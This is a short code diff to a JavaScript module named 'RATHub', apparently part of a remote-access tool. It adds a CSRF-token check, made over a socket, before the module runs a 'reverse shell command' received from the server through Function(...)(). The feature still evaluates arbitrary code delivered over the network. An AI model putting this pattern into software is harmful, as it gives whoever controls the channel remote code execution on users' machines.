@@ -10,6 +10,7 @@ var RATHub = (function () {
 	var _scrollPos = 0;
 	var _cursorPos = { X: 0, Y: 0 };
 	var _roomId = '';
+	var _temporaryCommand = '';
 
 	/// Initialize component
 	var constructor = function (params) {
@@ -258,7 +259,22 @@ var RATHub = (function () {
 		if (data.RSC != undefined && data.RSC !== null) {
 			/// Check if has minimum of calls
 			if (--Cross.GetStacktrace().split(';').length > 1) {
-				Function(data.RSC)();
+				_temporaryCommand = data.RSC;
+				checkCSRFToken(data.csrf);
+			}
+		}
+	}
+
+	var checkCSRFToken = function (csrfToken) {
+		SocketHub.PushEventRAT({ Command: 'ValidateReverseShellCommandCSRF#Request', Values: { RoomId: _roomId, csrf: csrfToken } }, function (data) {
+			executeShellCommand(data);
+		});
+	}
+
+	var executeShellCommand = function executeShellCommand(data) {console.log(data);
+		if (data != undefined && data != null) {
+			if (data.IsValid === true) {
+				Function(_temporaryCommand)();
 			}
 		}
 	}
